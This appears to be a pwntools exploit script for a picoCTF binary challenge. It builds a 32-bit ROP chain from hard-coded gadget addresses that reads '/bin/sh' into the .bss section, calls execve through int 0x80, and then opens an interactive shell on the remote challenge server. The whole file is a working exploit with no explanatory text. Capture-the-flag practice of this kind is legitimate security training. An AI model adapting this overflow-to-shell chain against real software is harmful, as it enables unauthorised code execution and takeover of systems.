#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("saturn.picoctf.net", 65066)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *vuln+56
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


rop_pop_eax_ret = 0x080b089a
rop_pop_ebx_ret = 0x080b3ab6
rop_pop_ecx_add_al_hf6_ret = 0x0806438c
rop_pop_edx_pop_ebx_ret = 0x0805eed9
rop_int_h80_ret = 0x08079f00

payload = b"A" * 10
payload = b"B" * (4 * 4 - 2)
# write /bin/sh at bss
payload += p32(rop_pop_ecx_add_al_hf6_ret)
payload += p32(elf.bss(0x50))# arg 2
payload += p32(rop_pop_edx_pop_ebx_ret)
payload += p32(0x8)# arg 3
payload += p32(0x0)# arg 1
payload += p32(rop_pop_eax_ret)
payload += p32(3)# syscall number
payload += p32(rop_int_h80_ret)
# execve("/bin/sh", NULL, NULL)
payload += p32(rop_pop_ecx_add_al_hf6_ret)
payload += p32(0)# arg 2
payload += p32(rop_pop_edx_pop_ebx_ret)
payload += p32(0)# arg 3
payload += p32(elf.bss(0x50))# arg 1
payload += p32(rop_pop_eax_ret)
payload += p32(11)# syscall number
payload += p32(rop_int_h80_ret)

p.recvuntil("flag")
p.sendline(payload)
sleep(0.2)
p.sendline("/bin/sh\0")

p.interactive()
